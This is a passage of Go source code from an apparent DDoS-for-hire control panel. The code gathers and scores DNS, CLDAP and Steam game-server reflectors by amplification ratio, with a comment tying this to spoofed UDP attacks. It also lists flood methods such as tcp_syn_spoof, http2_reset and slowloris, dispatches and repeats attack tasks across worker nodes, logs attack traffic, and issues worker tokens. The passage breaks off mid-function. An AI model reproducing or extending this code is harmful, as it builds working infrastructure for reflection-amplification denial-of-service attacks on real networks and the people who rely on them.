				if result.Game != "" && strings.Contains(strings.ToLower(result.Game), strings.ToLower(g.Name)) {
					targetPool = reflector.GetPool(g.ID)
					log.Printf("[pool] auto-classified %s:%d → %s pool", result.IP, result.Port, g.ID)
					break
				}
			}
		}

		if targetPool.Add(ref) {
			added++
		}
	}
	return added
}

func (c *Ctrl) testSingleDNSReflector(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, `{"error":"POST required"}`, 405)
		return
	}

	var req struct {
		IP      string   `json:"ip"`
		Port    int      `json:"port"`
		Domains []string `json:"domains"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, map[string]string{"error": "invalid request: " + err.Error()})
		return
	}
	if req.IP == "" {
		writeJSON(w, map[string]string{"error": "ip is required"})
		return
	}
	if req.Port == 0 {
		req.Port = 53
	}

	domains := c.resolveTestDomains(req.Domains)
	if len(domains) == 0 {
		writeJSON(w, map[string]string{"error": "no domains to test"})
		return
	}

	type domainResult struct {
		Domain       string  `json:"domain"`
		ResponseSize int     `json:"response_size"`
		QuerySize    int     `json:"query_size"`
		Ratio        float64 `json:"ratio"`
		TC           bool    `json:"tc"`
		Error        string  `json:"error,omitempty"`
	}

	customDomain := c.getCustomDNSDomain()
	customMustPass := customDomain != ""

	var testOrder []string
	if customMustPass {
		testOrder = []string{customDomain}
		for _, d := range domains {
			if d != customDomain {
				testOrder = append(testOrder, d)
			}
		}
	} else {
		testOrder = domains
	}

	results := make([]domainResult, 0, len(testOrder))
	timeout := 3 * time.Second

	for _, domain := range testOrder {
		dr := domainResult{Domain: domain}
		query := attack.BuildEDNSQueryForTest(domain, 16, 65535)
		dr.QuerySize = len(query)

		data, tc, err := attack.TestDNSQuery(req.IP, req.Port, query, timeout)
		if err != nil {
			dr.Error = err.Error()
			results = append(results, dr)
			if customMustPass && domain == customDomain {
				break
			}
			continue
		}

		dr.ResponseSize = len(data)
		dr.TC = tc
		// 始终计算 ratio，即使 TC=1（与 Python 脚本行为一致）
		if len(data) > 0 {
			dr.Ratio = float64(len(data)) / float64(dr.QuerySize)
		}
		results = append(results, dr)

		// TC=1 或响应过小时，自定义域名测试失败
		if customMustPass && domain == customDomain && (tc || len(data) < 500) {
			break
		}
	}

	var best *domainResult
	for i := range results {
		r := &results[i]
		// 排除错误、TC=1 截断、响应过小（<500B）的结果
		// TC=1 表示响应被截断需要 TCP，UDP 伪造攻击无法使用 TCP 回退，因此无效
		if r.Error != "" || r.TC || r.ResponseSize < 500 {
			continue
		}
		if best == nil || r.Ratio > best.Ratio {
			best = r
		}
	}

	resp := map[string]interface{}{"results": results}
	if best != nil {
		resp["best"] = map[string]interface{}{
			"domain":        best.Domain,
			"ratio":         best.Ratio,
			"response_size": best.ResponseSize,
		}
		pool := reflector.GetPool("dns")
		if pool != nil {
			pool.UpdateDNSTestResult(req.IP, req.Port, true, best.Domain, best.Ratio, best.ResponseSize, fmt.Sprintf("DNS(%dB %s)", best.ResponseSize, best.Domain))
		}
	} else if customMustPass {
		pool := reflector.GetPool("dns")
		if pool != nil {
			pool.UpdateTestResult(req.IP, req.Port, false)
		}
	}
	writeJSON(w, resp)
}

func (c *Ctrl) getCustomDNSDomain() string {
	c.dnsAmpMu.RLock()
	defer c.dnsAmpMu.RUnlock()
	return c.dnsAmpDomain
}

func (c *Ctrl) testSingleCLDAPReflector(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, `{"error":"POST required"}`, 405)
		return
	}

	var req struct {
		IP   string `json:"ip"`
		Port int    `json:"port"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, map[string]string{"error": "invalid request: " + err.Error()})
		return
	}
	if req.IP == "" {
		writeJSON(w, map[string]string{"error": "ip is required"})
		return
	}
	if req.Port == 0 {
		req.Port = 389
	}

	timeout := 3 * time.Second
	querySize := len(attack.GetCLDAPQuery())
	respSize, err := attack.TestCLDAPQuery(req.IP, req.Port, timeout)

	result := map[string]interface{}{
		"ip":         req.IP,
		"port":       req.Port,
		"query_size": querySize,
		"ratio":      0.0,
	}

	if err != nil {
		result["error"] = err.Error()
		result["response_size"] = 0
	} else {
		result["response_size"] = respSize
		if respSize > 0 {
			result["ratio"] = float64(respSize) / float64(querySize)
		}
	}

	pool := reflector.GetPool("cldap")
	if pool != nil && err == nil {
		ratio := float64(respSize) / float64(querySize)
		pool.UpdateDNSTestResult(req.IP, req.Port, true, "", ratio, respSize, fmt.Sprintf("CLDAP(%dB %.1fx)", respSize, ratio))
	}

	writeJSON(w, map[string]interface{}{"result": result})
}

func (c *Ctrl) resolveTestDomains(input []string) []string {
	c.dnsAmpMu.RLock()
	customDomain := c.dnsAmpDomain
	c.dnsAmpMu.RUnlock()

	builtinDomains := attack.GetAmpDomains()

	if len(input) == 0 {
		return nil
	}

	expandAll := false
	includeCustom := false
	manualDomains := make([]string, 0)
	seen := make(map[string]bool)

	for _, d := range input {
		d = strings.TrimSpace(d)
		switch d {
		case "all":
			expandAll = true
		case "custom":
			includeCustom = true
		case "":
			continue
		default:
			if !seen[d] {
				seen[d] = true
				manualDomains = append(manualDomains, d)
			}
		}
	}

	result := make([]string, 0)
	if includeCustom && customDomain != "" {
		result = append(result, customDomain)
	}
	if expandAll {
		if customDomain != "" {
			result = append(result, customDomain)
		}
		for _, d := range builtinDomains {
			result = append(result, d)
		}
	}
	for _, d := range manualDomains {
		if !containsStr(result, d) {
			result = append(result, d)
		}
	}

	return result
}

func containsStr(slice []string, s string) bool {
	for _, item := range slice {
		if item == s {
			return true
		}
	}
	return false
}

func (c *Ctrl) refreshGamePool(w http.ResponseWriter, r *http.Request, gameID string, pool *reflector.Pool) {
	queried, added, err := c.refreshSteamPool(gameID, pool)
	if err != nil {
		writeJSON(w, map[string]string{"error": err.Error()})
		return
	}
	writeJSON(w, map[string]interface{}{
		"ok": true, "queried": queried, "added": added, "total": pool.Count(), "challenge": 0,
	})
}

// refreshSteamPool 查询 Steam API 并替换指定池的 steam 条目。
// 返回 (查询数量, 验证通过数量, 错误)。并发内部处理。
func (c *Ctrl) refreshSteamPool(gameID string, pool *reflector.Pool) (int, int, error) {
	var gc *reflector.GameConfig
	for i, g := range reflector.Games {
		if g.ID == gameID {
			gc = &reflector.Games[i]
			break
		}
	}
	if gc == nil || gc.AppID == 0 {
		return 0, 0, fmt.Errorf("no Steam appid for %s", gameID)
	}

	log.Printf("[pool] %s: querying Steam API (appID=%d)...", gameID, gc.AppID)
	servers, err := attack.QuerySteamByAppID(gc.AppID, gc.SteamFilter, 15*time.Second)
	if err != nil {
		log.Printf("[pool] %s: Steam API error: %v", gameID, err)
		return 0, 0, err
	}
	log.Printf("[pool] %s: Steam returned %d servers, verifying...", gameID, len(servers))

	added := 0
	sem := make(chan struct{}, 200)
	var mu sync.Mutex
	var wg sync.WaitGroup
	now := time.Now().Unix()
	timeout := 2 * time.Second

	newEntries := make([]reflector.Reflector, 0)
	for _, s := range servers {
		wg.Add(1)
		sem <- struct{}{}
		go func(target string) {
			defer wg.Done()
			defer func() { <-sem }()
			ip, port := attack.SplitTarget(target)
			if port == 0 {
				port = 27015
			}
			result := attack.ScanIP(ip, port, timeout)
			if result != nil {
				mu.Lock()
				newEntries = append(newEntries, reflector.Reflector{
					IP: result.IP, Port: result.Port,
					ResponseSize: result.ResponseSize,
					ServerName:   result.ServerName,
					Game:         result.Game,
					Source:       "steam",
					AddedAt:      now,
					HasChallenge: result.HasChallenge,
					SuccessCount: 1,
					LastTested:   now,
					LastValid:    true,
				})
				added++
				mu.Unlock()
			}
		}(s)
	}
	wg.Wait()

	pool.ReplaceSteamEntries(newEntries)

	log.Printf("[pool] %s: refreshed, steam=%d entries, total=%d", gameID, added, pool.Count())
	return len(servers), added, nil
}

func (c *Ctrl) testGamePool(w http.ResponseWriter, gameID string, pool *reflector.Pool) {
	tested, removed := c.testPoolEntries(gameID, pool)
	if w != nil {
		writeJSON(w, map[string]interface{}{"ok": true, "tested": tested, "removed": removed, "remaining": len(pool.GetManualEntries())})
	}
}

// testPoolEntries 测试池中所有手动条目并清理失效的。返回 (测试数, 移除数)。
func (c *Ctrl) testPoolEntries(gameID string, pool *reflector.Pool) (int, int) {
	entries := pool.GetManualEntries()
	if len(entries) == 0 {
		return 0, 0
	}

	isDNS := gameID == "dns"
	isCLDAP := gameID == "cldap"
	log.Printf("[pool] %s: testing %d manual entries...", gameID, len(entries))
	sem := make(chan struct{}, 200)
	var wg sync.WaitGroup
	timeout := 2 * time.Second

	for _, entry := range entries {
		wg.Add(1)
		sem <- struct{}{}
		go func(ip string, port int) {
			defer wg.Done()
			defer func() { <-sem }()
			if isDNS {
				result := attack.ScanDNSResolver(ip, port, timeout)
				if result != nil {
					pool.UpdateDNSTestResult(ip, port, true, result.BestDomain, result.AmpRatio, result.ResponseSize, result.ServerName)
				} else {
					pool.UpdateTestResult(ip, port, false)
				}
			} else if isCLDAP {
				result := attack.ScanCLDAPResponder(ip, port, timeout)
				if result != nil {
					pool.UpdateDNSTestResult(ip, port, true, "", result.AmpRatio, result.ResponseSize, result.ServerName)
				} else {
					pool.UpdateTestResult(ip, port, false)
				}
			} else {
				ok := attack.ScanIP(ip, port, timeout) != nil
				pool.UpdateTestResult(ip, port, ok)
			}
		}(entry.IP, entry.Port)
	}
	wg.Wait()

	removed := pool.RemoveInvalidManual()
	log.Printf("[pool] %s: test done, removed %d invalid, remaining manual=%d", gameID, removed, len(pool.GetManualEntries()))
	return len(entries), removed
}

func (c *Ctrl) handleReflectorsAll(w http.ResponseWriter, r *http.Request) {
	poolFilter := r.URL.Query().Get("pool")
	var targets []string
	if poolFilter != "" {
		pool := reflector.GetPool(poolFilter)
		if pool != nil {
			targets = pool.GetTargets()
		}
	} else {
		targets = reflector.AllTargets()
	}
	writeJSON(w, targets)
}

// allPoolEntriesBySource 聚合所有游戏池中指定 source（steam/manual/shodan）的条目
func allPoolEntriesBySource(source string) []reflector.Reflector {
	var out []reflector.Reflector
	for _, info := range reflector.GetPoolInfo() {
		p := reflector.GetPool(info.Game)
		if p == nil {
			continue
		}
		for _, r := range p.List() {
			if r.Source == source {
				out = append(out, r)
			}
		}
	}
	return out
}

// removeEntryFromAllPools 从所有池中删除指定条目
func removeEntryFromAllPools(ip string, port int) bool {
	removed := false
	for _, info := range reflector.GetPoolInfo() {
		p := reflector.GetPool(info.Game)
		if p != nil && p.Remove(ip, port) {
			removed = true
		}
	}
	return removed
}

// totalPoolCount 所有池条目总数
func totalPoolCount() int {
	total := 0
	for _, info := range reflector.GetPoolInfo() {
		total += info.Total
	}
	return total
}

// handleReflectorsSteam GET/POST /api/reflectors/steam
// GET: 所有 Steam 来源条目；POST: 并行刷新所有 Steam 池
func (c *Ctrl) handleReflectorsSteam(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		writeJSON(w, allPoolEntriesBySource("steam"))

	case "POST":
		totalQueried, totalAdded := 0, 0
		var wg sync.WaitGroup
		var mu sync.Mutex
		for i := range reflector.Games {
			g := &reflector.Games[i]
			if g.AppID == 0 {
				continue
			}
			p := reflector.GetPool(g.ID)
			if p == nil {
				continue
			}
			wg.Add(1)
			go func(id string, pool *reflector.Pool) {
				defer wg.Done()
				q, a, err := c.refreshSteamPool(id, pool)
				mu.Lock()
				totalQueried += q
				totalAdded += a
				mu.Unlock()
				if err != nil {
					log.Printf("[pool] %s: steam refresh error: %v", id, err)
				}
			}(g.ID, p)
		}
		wg.Wait()
		writeJSON(w, map[string]interface{}{
			"ok": true, "queried": totalQueried, "added": totalAdded,
			"total": totalPoolCount(), "total_pool": totalPoolCount(),
		})

	default:
		http.Error(w, `{"error":"method not allowed"}`, 405)
	}
}

// handleReflectorsManual GET/POST/DELETE /api/reflectors/manual
func (c *Ctrl) handleReflectorsManual(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		writeJSON(w, allPoolEntriesBySource("manual"))

	case "POST":
		var refs []struct {
			IP   string `json:"ip"`
			Port int    `json:"port"`
		}
		if err := json.NewDecoder(r.Body).Decode(&refs); err != nil {
			writeJSON(w, map[string]string{"error": err.Error()})
			return
		}
		targets := make([]string, 0, len(refs))
		for _, ref := range refs {
			if ref.IP == "" {
				continue
			}
			if ref.Port == 0 {
				ref.Port = 27015
			}
			targets = append(targets, fmt.Sprintf("%s:%d", ref.IP, ref.Port))
		}
		if len(targets) > maxManualAddEntries {
			writeJSON(w, map[string]string{"error": fmt.Sprintf("too many entries: max %d per request", maxManualAddEntries)})
			return
		}
		added := 0
		if len(targets) > 0 {
			if pool := reflector.GetPool("other"); pool != nil {
				added = c.addReflectorsToPool("other", pool, targets)
			}
		}
		writeJSON(w, map[string]interface{}{"ok": true, "added": added, "total": totalPoolCount()})

	case "DELETE":
		ip := r.URL.Query().Get("ip")
		port := 0
		fmt.Sscanf(r.URL.Query().Get("port"), "%d", &port)
		removed := removeEntryFromAllPools(ip, port)
		writeJSON(w, map[string]interface{}{"ok": true, "removed": removed})

	default:
		http.Error(w, `{"error":"method not allowed"}`, 405)
	}
}

// handleReflectorsManualTest POST /api/reflectors/manual/test
// 测试所有池的手动条目并清理失效的
func (c *Ctrl) handleReflectorsManualTest(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, `{"error":"POST required"}`, 405)
		return
	}
	totalTested, totalRemoved := 0, 0
	for _, info := range reflector.GetPoolInfo() {
		p := reflector.GetPool(info.Game)
		if p == nil {
			continue
		}
		tested, removed := c.testPoolEntries(info.Game, p)
		totalTested += tested
		totalRemoved += removed
	}
	writeJSON(w, map[string]interface{}{
		"ok": true, "tested": totalTested, "removed": totalRemoved, "total": totalPoolCount(),
	})
}

func (c *Ctrl) handleReflectorsVersion(w http.ResponseWriter, r *http.Request) {
	game := r.URL.Query().Get("game")
	if game == "" {
		game = "dns"
	}

	c.poolVersionMu.RLock()
	version := c.poolVersion[game]
	c.poolVersionMu.RUnlock()

	pool := reflector.GetPool(game)
	count := 0
	if pool != nil {
		count = pool.Count()
	}

	writeJSON(w, map[string]interface{}{
		"version":      fmt.Sprintf("%d-%d", version, count),
		"count":        count,
		"last_updated": version,
	})
}

// handleReflectorsCandidates 获取候选池（支持地理位置筛选）
func (c *Ctrl) handleReflectorsCandidates(w http.ResponseWriter, r *http.Request) {
	game := r.URL.Query().Get("game")
	country := r.URL.Query().Get("country")
	limit := 1000
	if limitStr := r.URL.Query().Get("limit"); limitStr != "" {
		fmt.Sscanf(limitStr, "%d", &limit)
	}
	if limit <= 0 || limit > 10000 {
		limit = 1000
	}

	candidates, err := reflector.GetCandidates(game, country, limit)
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%v"}`, err), 500)
		return
	}

	writeJSON(w, candidates)
}

// broadcastPoolUpdate 广播池更新信号给所有 WebSocket 客户端
func (c *Ctrl) broadcastPoolUpdate(game string, version int64) {
	c.poolVersionMu.Lock()
	c.poolVersion[game] = version
	c.poolVersionMu.Unlock()

	pool := reflector.GetPool(game)
	count := 0
	if pool != nil {
		count = pool.Count()
	}

	msg := map[string]interface{}{
		"type":      "pool_updated",
		"game":      game,
		"version":   fmt.Sprintf("%d-%d", version, count),
		"count":     count,
		"timestamp": version,
	}

	data, _ := json.Marshal(msg)

	// 非阻塞入队：持锁时间极短，不再逐客户端同步写（此前持 wsMu.RLock
	// 期间写 IO 会阻塞新连接注册与其他广播）
	c.wsMu.RLock()
	clientCount := len(c.wsClients)
	for client := range c.wsClients {
		client.enqueue(data)
	}
	c.wsMu.RUnlock()

	log.Printf("[pool] broadcasted update: game=%s version=%d count=%d to %d clients", game, version, count, clientCount)
}

func (c *Ctrl) cronSteamRefresh() {
	if !attack.HasSteamAPIKey() {
		return
	}
	refreshInterval := 6 * time.Hour
	log.Printf("[pool] steam auto-refresh every 6h")
	time.Sleep(30 * time.Second)

	for _, g := range reflector.Games {
		if g.AppID > 0 {
			c.doGameSteamRefresh(&g)
		}
	}

	ticker := time.NewTicker(refreshInterval)
	defer ticker.Stop()
	for range ticker.C {
		for _, g := range reflector.Games {
			if g.AppID > 0 {
				c.doGameSteamRefresh(&g)
			}
		}
	}
}

func (c *Ctrl) doGameSteamRefresh(gc *reflector.GameConfig) {
	log.Printf("[pool] %s: auto-refresh Steam...", gc.ID)
	servers, err := attack.QuerySteamByAppID(gc.AppID, gc.SteamFilter, 15*time.Second)
	if err != nil {
		log.Printf("[pool] %s: auto-refresh error: %v", gc.ID, err)
		return
	}

	pool := reflector.GetPool(gc.ID)
	if pool == nil {
		return
	}

	now := time.Now().Unix()
	sem := make(chan struct{}, 200)
	var mu sync.Mutex
	var wg sync.WaitGroup
	var newEntries []reflector.Reflector
	challengeCount := 0

	for _, s := range servers {
		wg.Add(1)
		sem <- struct{}{}
		go func(target string) {
			defer wg.Done()
			defer func() { <-sem }()
			ip, port := attack.SplitTarget(target)
			if port == 0 {
				port = 27015
			}
			result := attack.ScanIP(ip, port, 2*time.Second)
			if result != nil {
				mu.Lock()
				newEntries = append(newEntries, reflector.Reflector{
					IP: result.IP, Port: result.Port,
					ResponseSize: result.ResponseSize,
					ServerName:   result.ServerName,
					Game:         result.Game,
					Source:       "steam",
					AddedAt:      now,
					HasChallenge: result.HasChallenge,
					SuccessCount: 1,
					LastTested:   now,
					LastValid:    true,
				})
				if result.HasChallenge {
					challengeCount++
				}
				mu.Unlock()
			}
		}(s)
	}
	wg.Wait()

	pool.ReplaceSteamEntries(newEntries)
	log.Printf("[pool] %s: auto-refresh done, steam=%d entries (challenge=%d filtered), total=%d",
		gc.ID, len(newEntries), challengeCount, pool.Count())
}

func (c *Ctrl) cronManualTest() {
	log.Printf("[pool] manual auto-test every 1h")
	for _, g := range reflector.Games {
		pool := reflector.GetPool(g.ID)
		if pool != nil {
			c.testGamePool(nil, g.ID, pool)
		}
	}
	ticker := time.NewTicker(1 * time.Hour)
	defer ticker.Stop()
	for range ticker.C {
		for _, g := range reflector.Games {
			pool := reflector.GetPool(g.ID)
			if pool != nil {
				c.testGamePool(nil, g.ID, pool)
			}
		}
	}
}

var validMethods = map[string]bool{
	"vse": true, "vse_reflector": true, "dns_reflector": true, "cldap_reflector": true,
	"udp_stdhex": true, "udp_plain": true, "udp_bypass": true, "udp_burst": true,
	"tcp_syn": true, "tcp_ack": true, "tcp_connect": true, "tcp_tcpbypass": true,
	"tcp_syn_spoof": true, "http_flood": true, "head_flood": true, "range_flood": true, "post_flood": true, "http2_flood": true, "http2_reset": true, "http2_continuation": true, "http2_bomb": true, "h2_ping": true, "tls_handshake": true, "https_bypass": true,
	"slowloris": true, "slow_post": true,
	"minecraft_handshake": true, "minecraft_login": true, "game_udp": true,
	"combo": true,
}

func isValidMethod(method string) bool {
	return validMethods[method]
}

func peerFromContext(ctx context.Context) (string, bool) {
	p, ok := peer.FromContext(ctx)
	if !ok {
		return "", false
	}
	host, _, err := net.SplitHostPort(p.Addr.String())
	if err != nil {
		return p.Addr.String(), true
	}
	return host, true
}

func (c *Ctrl) handleTemplates(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		c.mu.RLock()
		list := make([]AttackTemplate, 0, len(c.templates))
		for _, t := range c.templates {
			list = append(list, t)
		}
		c.mu.RUnlock()
		writeJSON(w, list)

	case "POST":
		var t AttackTemplate
		if err := json.NewDecoder(r.Body).Decode(&t); err != nil {
			writeJSON(w, map[string]string{"error": err.Error()})
			return
		}
		if t.Name == "" {
			writeJSON(w, map[string]string{"error": "name is required"})
			return
		}
		c.mu.Lock()
		c.templates[t.Name] = t
		c.mu.Unlock()
		c.saveTemplates()
		writeJSON(w, map[string]interface{}{"ok": true})

	case "DELETE":
		name := r.URL.Query().Get("name")
		if name == "" {
			writeJSON(w, map[string]string{"error": "name is required"})
			return
		}
		c.mu.Lock()
		delete(c.templates, name)
		c.mu.Unlock()
		c.saveTemplates()
		writeJSON(w, map[string]interface{}{"ok": true})

	default:
		http.Error(w, `{"error":"method not allowed"}`, 405)
	}
}

func (c *Ctrl) saveTemplates() {
	c.mu.RLock()
	data, err := json.MarshalIndent(c.templates, "", "  ")
	c.mu.RUnlock()
	if err != nil {
		return
	}
	os.WriteFile("data/templates.json", data, 0644)
}

func (c *Ctrl) loadTemplates() {
	data, err := os.ReadFile("data/templates.json")
	if err != nil {
		return
	}
	var templates map[string]AttackTemplate
	if err := json.Unmarshal(data, &templates); err != nil {
		return
	}
	c.mu.Lock()
	c.templates = templates
	c.mu.Unlock()
}

func (c *Ctrl) handleLogs(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/api/logs")
	path = strings.TrimPrefix(path, "/")

	if path == "export" || strings.HasSuffix(path, "/export") {
		csv := reflector.ExportLogsCSV()
		w.Header().Set("Content-Type", "text/csv")
		w.Header().Set("Content-Disposition", "attachment; filename=attack_logs.csv")
		w.Write([]byte(csv))
		return
	}

	page := 1
	limit := 50
	method := r.URL.Query().Get("method")
	status := r.URL.Query().Get("status")
	fmt.Sscanf(r.URL.Query().Get("page"), "%d", &page)
	fmt.Sscanf(r.URL.Query().Get("limit"), "%d", &limit)
	// 防滥用：limit 上限 1000（?limit=1e9 会把整表拉进内存）
	if page < 1 {
		page = 1
	}
	if limit < 1 {
		limit = 50
	}
	if limit > 1000 {
		limit = 1000
	}

	logs, total := reflector.GetLogs(method, status, page, limit)
	writeJSON(w, map[string]interface{}{
		"logs": logs, "total": total, "page": page, "limit": limit,
	})
}

// handleLogStats GET /api/logs/stats?days=7
// 任务历史统计：总览 + 按方法/目标/日期的聚合。
func (c *Ctrl) handleLogStats(w http.ResponseWriter, r *http.Request) {
	days := 7
	fmt.Sscanf(r.URL.Query().Get("days"), "%d", &days)
	writeJSON(w, reflector.GetLogStats(days))
}

// buildTaskLog 在调用方持有 c.mu 的前提下，把 task 及其 Workers 聚合成
// 一个自包含的 AttackLog 值快照。必须在锁内调用：它读取 task.Workers 和
// task 的多个字段，而 ReportStats 会并发写这些字段。
func (c *Ctrl) buildTaskLog(task *TaskInfo) reflector.AttackLog {
	workers := 0
	var totalPkts, totalBytes, totalErrs, peakPPS, peakBPS uint64
	for _, w := range task.Workers {
		workers++
		totalPkts += w.PacketsSent
		totalBytes += w.BytesSent
		totalErrs += w.Errors
		if w.CurrentPPS > peakPPS {
			peakPPS = w.CurrentPPS
		}
		if w.CurrentBPS > peakBPS {
			peakBPS = w.CurrentBPS
		}
	}
	return reflector.AttackLog{
		TaskID: task.TaskID, Target: task.Target, Method: task.Method,
		Duration: int(task.Duration), StartTime: task.CreatedAt.Unix(),
		EndTime: time.Now().Unix(), TotalPackets: int64(totalPkts),
		TotalBytes: int64(totalBytes), PeakPPS: int64(peakPPS),
		PeakBPS: int64(peakBPS), TotalErrors: int64(totalErrs),
		WorkerCount: workers, Status: task.Status,
	}
}

// logTaskComplete 接收已聚合的值快照，可安全地在 goroutine 中调用（无共享状态）。
func (c *Ctrl) logTaskComplete(entry reflector.AttackLog) {
	reflector.LogAttack(entry)
}

func (c *Ctrl) cronShodanLoad() {
	cfg := loadShodanConfig()
	if !cfg.Enabled || cfg.Key == "" {
		return
	}
	log.Printf("[shodan] key configured, starting auto-refresh")
	c.cronShodanRefresh()
}

func (c *Ctrl) cronCleanupDB() {
	log.Printf("[db] cleanup every 24h")
	ticker := time.NewTicker(24 * time.Hour)
	defer ticker.Stop()
	for range ticker.C {
		reflector.CleanupDB()
	}
}

// watchTaskTimeout 检测超时 running 任务与无人确认的 cancelling 任务。
//   - running 超时：先置 cancelling 等待所有 worker 停止（清场），再重新派发，
//     避免旧攻击未停就重复派发导致双份流量叠加；最多重试 3 次后标记 failed。
//   - cancelling 超时（30s 无任何 worker 确认，如所有持有者已离线）：直接终结。
func (c *Ctrl) watchTaskTimeout() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		c.mu.Lock()
		for id, task := range c.tasks {
			// 重复攻击续发：自然完成且仍有剩余次数 → 创建下一次任务
			// （用户 stop 的任务 StoppedByUser=true，不续发）
			if task.Status == "completed" && !task.StoppedByUser && task.RepeatLeft > 0 {
				task.RepeatLeft--
				seqNum := task.RepeatCount - task.RepeatLeft
				nextID := fmt.Sprintf("%s-r%d", task.ParentTaskID, seqNum)
				next := *task
				next.TaskID = nextID
				next.Status = "pending"
				next.CreatedAt = time.Now()
				next.StartTime = time.Time{}
				next.FinishedAt = time.Time{}
				next.Workers = make(map[string]*TaskStats)
				next.RetryCount = 0
				next.CancelAcks = nil
				next.CancelToRetry = false
				next.StoppedByUser = false
				next.NextRunAt = time.Now().Add(time.Duration(task.RepeatInterval) * time.Second)
				next.ParentTaskID = task.ParentTaskID
				c.tasks[nextID] = &next
				if next.Priority == 1 {
					c.pendingIDs = append([]string{nextID}, c.pendingIDs...)
				} else {
					c.pendingIDs = append(c.pendingIDs, nextID)
				}
				log.Printf("[task] %s repeat scheduled: next run %s (left=%d)",
					nextID, next.NextRunAt.Format(time.RFC3339), next.RepeatLeft)
				continue // 原任务保留为历史记录
			}

			// 终态任务清理：历史已落库 attack_logs（logTaskComplete），
			// 内存任务保留 10 分钟后删除，防止长时间运行 c.tasks 无界增长。
			if (task.Status == "completed" || task.Status == "failed") &&
				!task.FinishedAt.IsZero() && time.Since(task.FinishedAt) > 10*time.Minute {
				delete(c.tasks, id)
				continue
			}
			switch task.Status {
			case "pending":
				// 定时（重复攻击）任务未到执行时间：跳过 30s 强制翻转
				if task.NextRunAt.After(time.Now()) {
					continue
				}
				// 保护：任务创建 30s 后仍有节点未领取（如攻击瞬间全体短暂掉线、
				// 派发窗口被心跳节奏拉长），不再等待，已领取节点直接开打。
				// 未领取的节点恢复上线后也不会收到该任务（running 不再派发）。
				if time.Since(task.CreatedAt) > 30*time.Second {
					if len(task.Workers) == 0 {
						// 一个都没派出去（如创建瞬间所有节点掉线）：标记 failed 让用户重试
						task.Status = "failed"
						task.FinishedAt = time.Now()
						entry := c.buildTaskLog(task)
						go c.logTaskComplete(entry)
						log.Printf("[task] %s failed (no worker received dispatch within 30s)", id)
						continue
					}
					task.Status = "running"
					task.StartTime = time.Now()
					log.Printf("[task] %s -> running (forced after 30s dispatch window, workers=%d)", id, len(task.Workers))
				}
			case "running":
				timeout := time.Duration(task.Duration+120) * time.Second
				if time.Since(task.StartTime) < timeout {
					continue
				}
				if task.RetryCount < 3 {
					task.RetryCount++
					task.Status = "cancelling"
					task.CancelToRetry = true
					task.CancelAcks = nil
					task.CancellingSince = time.Now()
					c.cancelIDs = append(c.cancelIDs, id)
					log.Printf("[task] %s timed out, cancelling for retry %d/3", id, task.RetryCount)
				} else {
					task.Status = "failed"
					task.FinishedAt = time.Now()
					entry := c.buildTaskLog(task)
					go c.logTaskComplete(entry)
					// 复位节点状态：否则节点永久显示 ATTACKING
					c.resetNodeStatusesLocked(taskWorkerIDs(task)...)
					log.Printf("[task] %s failed after 3 retries", id)
				}
			case "cancelling":
				// 兜底：所有持有者均已确认/离线时即使没有心跳来触发也要终结
				if c.taskFullyCancelled(task) {
					c.finishCancellingTask(task)
				} else if !task.CancellingSince.IsZero() && time.Since(task.CancellingSince) > 5*time.Minute {
					// 绝对超时兜底：个别 worker 的确认可能永久丢失
					// （已完成 worker 不 ack + 在线节点确认丢失等），
					// 5 分钟无进展强制终结，避免任务永久卡在 cancelling。
					log.Printf("[task] %s cancelling stuck >5min, force finishing", id)
					c.finishCancellingTask(task)
				}
			}
		}
		c.mu.Unlock()
	}
}

// loadWorkerTokens 从 data/auth/workers/ 加载所有 worker token
func (c *Ctrl) loadWorkerTokens() {
	dir := "data/auth/workers"
	os.MkdirAll(dir, 0700)

	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}

	c.workerTokensMu.Lock()
	defer c.workerTokensMu.Unlock()

	for _, entry := range entries {
		if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".token") {
			continue
		}
		filePath := filepath.Join(dir, entry.Name())
		data, err := os.ReadFile(filePath)
		if err != nil {
			continue
		}
		token := strings.TrimSpace(string(data))
		if token != "" {
			c.workerTokens[token] = true
			c.workerTokenFiles[token] = filePath
		}
	}

	if len(c.workerTokens) > 0 {
		log.Printf("[auth] loaded %d per-worker tokens", len(c.workerTokens))
	}
}

// handleProvisionToken 生成新的 worker token
func (c *Ctrl) handleProvisionToken(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, `{"error":"POST required"}`, 405)
		return
	}

	// 生成新 token
	token := make([]byte, 32)
	rand.Read(token)
	tokenStr := hex.EncodeToString(token)

	// 保存到 data/auth/workers/
	dir := "data/auth/workers"
	os.MkdirAll(dir, 0700)
	filename := fmt.Sprintf("%s-%d.token", tokenStr[:8], time.Now().Unix())
	tokenFile := filepath.Join(dir, filename)

	if err := os.WriteFile(tokenFile, []byte(tokenStr), 0600); err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"write token: %v"}`, err), 500)
		return
	}

	c.workerTokensMu.Lock()
	c.workerTokens[tokenStr] = true
	c.workerTokenFiles[tokenStr] = tokenFile
	c.workerTokensMu.Unlock()

	log.Printf("[auth] provisioned new worker token: %s", tokenStr[:16]+"...")
	c.auditAction(r, "token_provision", tokenStr[:16]+"...")
	writeJSON(w, map[string]interface{}{
		"success": true,
		"token":   tokenStr,
		"file":    filename,
	})
}

// handleRevokeToken 撤销 worker token
func (c *Ctrl) handleRevokeToken(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, `{"error":"POST required"}`, 405)
		return
	}

	var req struct {
		Token string `json:"token"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"invalid json"}`, 400)
		return
	}

	if req.Token == "" {
